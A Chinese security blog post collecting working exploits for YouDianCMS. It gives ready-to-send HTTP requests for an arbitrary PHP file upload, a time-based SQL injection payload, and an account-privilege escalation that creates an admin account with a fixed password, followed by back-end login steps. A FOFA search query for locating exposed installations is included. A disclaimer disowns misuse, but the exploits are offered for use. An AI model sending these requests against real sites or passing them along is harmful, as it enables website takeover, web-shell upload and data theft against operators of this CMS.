#  YouDianCMS友点系统漏洞合集   
原创 小白菜安全  小白菜安全   2024-02-23 17:30  
  
**免责声明**  
  
该公众号主要是分享互联网上公开的一些漏洞poc和工具，  
利用本公众号所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责，本公众号及作者不为此承担任何责任，一旦造成后果请自行承担！如果本公众号分享导致的侵权行为请告知，我们会立即删除并道歉。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/NhLcT1kxlia1Au88bO1jFd8V3AmqMvsqEZUFalBicQwJaic1tesic3duRuGPPQ3E1vczEJ67UzoMicSWMZpKwRElxtA/640?wx_fmt=png "")  
  
**漏洞影响范围**  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/NhLcT1kxlia2tBfX56PXZIAGlkUQ0e3opW1icU9QembBfNEGjpJSYTZJwm7yg138pibcOGlOOsF4QCt5MSeicafh6A/640?wx_fmt=png&from=appmsg "")  
#  漏洞复现  
  
  
**1.image_upload接口任意文件上传**  
```
POST /Public/ckeditor/plugins/multiimage/dialogs/image_upload.php HTTP/2
Host:
Content-Type: multipart/form-data;boundary=----WebKitFormBoundarydAPjrmyKewWuf59H
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36
Content-Length: 227

------WebKitFormBoundarydAPjrmyKewWuf59H
Content-Disposition: form-data; name="files"; filename="c.php"
Content-Type: image/jpg
 
123
------WebKitFormBoundarydAPjrmyKewWuf59H--
```  
  
返回这样的信息就代表漏洞存在：  
  
{"result":"200","msg":"/image/uploads/1708664341678.php"}  
  
  
2.**GetSpecial**接口SQL延时注入漏洞  
```
GET /index.php/api/GetSpecial?debug=1&ChannelID=1&IdList=1,1%29%20and%20%28SELECT%20%2A%20FROM%20%28SELECT%28SLEEP%282%29%29%29A HTTP/1.1
Host: 
accept: */*
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9
Cookie: PHPSESSID=din23h07blv026kk4tdqt1re00
Connection: close
```  
  
返回这样的信息就代表漏洞存在：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/NhLcT1kxlia2tBfX56PXZIAGlkUQ0e3opL0cMhJQJnaBDZVaNjZqv95RCsIiaaktvoncjYxXyjx9TItRtjIFV9dw/640?wx_fmt=png&from=appmsg "")  
  
  
  
3.最新版本YouDianCMS 9.5.11水平越权-获取后台权限  
```
POST /index.php/Admin/member/SetAdmin HTTP/1.1
Host: 192.168.169.142
Content-Length: 810
Upgrade-Insecure-Requests: 1
Origin: null
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryxSRzg4Lt1bzJyrqr
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9
Connection: close
Cookie: ajs_anonymous_id=f22f8860-0882-4501-ac59-d541373cfacc; ajs_user_id=7052de16e0cf5c6ff476e7b3e592cb259331a467; PHPSESSID=i6omf842qvaa6clbooe0ttktc5
Cache-Control: no-cache
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36

------WebKitFormBoundaryxSRzg4Lt1bzJyrqr
Content-Disposition: form-data; name="NowPage"

1
------WebKitFormBoundaryxSRzg4Lt1bzJyrqr
Content-Disposition: form-data; name="dlgMemberID"

2
------WebKitFormBoundaryxSRzg4Lt1bzJyrqr
Content-Disposition: form-data; name="dlgAdminName"

admin2
------WebKitFormBoundaryxSRzg4Lt1bzJyrqr
Content-Disposition: form-data; name="dlgAdminGroupID"

1
------WebKitFormBoundaryxSRzg4Lt1bzJyrqr
Content-Disposition: form-data; name="pwd3"

Admin123456
------WebKitFormBoundaryxSRzg4Lt1bzJyrqr
Content-Disposition: form-data; name="pwd4"

Admin123456
------WebKitFormBoundaryxSRzg4Lt1bzJyrqr
Content-Disposition: form-data; name="__hash__"

24982b0d920e656b633764d3a2558895_3ffae5121575f72fa21d87a52342b47d
------WebKitFormBoundaryxSRzg4Lt1bzJyrqr--

```  
  
3.1 要先获取一个前台的账号密码前台登录地址：  
  
url+/index.php/public/login/l/cn,也可以注册一个但是要审核  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/NhLcT1kxlia2tBfX56PXZIAGlkUQ0e3opAOvrswSPtrBlcvjiaYAv6NhSXd69pRgiayibdQ7Aez0SWXuZjTdzVLrCw/640?wx_fmt=png&from=appmsg "")  
  
3.2 登录获取cookie替换数据包就行,出现如下数据代表利用成功  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/NhLcT1kxlia2tBfX56PXZIAGlkUQ0e3op6FW5ZauFKbIEPibEdTtTOsaB8mwhJf4iaNCqjfeTSkN1Nb1Vuh7oDl9A/640?wx_fmt=png&from=appmsg "")  
  
3.3 登录后台：url+/index.php/Admin/public/Login，账号密码admin2/Admin123456  
  
后台上传接口  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/NhLcT1kxlia2tBfX56PXZIAGlkUQ0e3opjkQbuYnp8seT7WtFRa52h88UJoiaiaDslR5Zdj4Tn58WjbAB3dw7QnaA/640?wx_fmt=png&from=appmsg "")  
  
**源码获取:**  
http://www.youdiancms.com/soft.html  
# 搜索语法  
  
**fofa：app="友点建站-CMS" && product="友点建站-CMS"**  
  
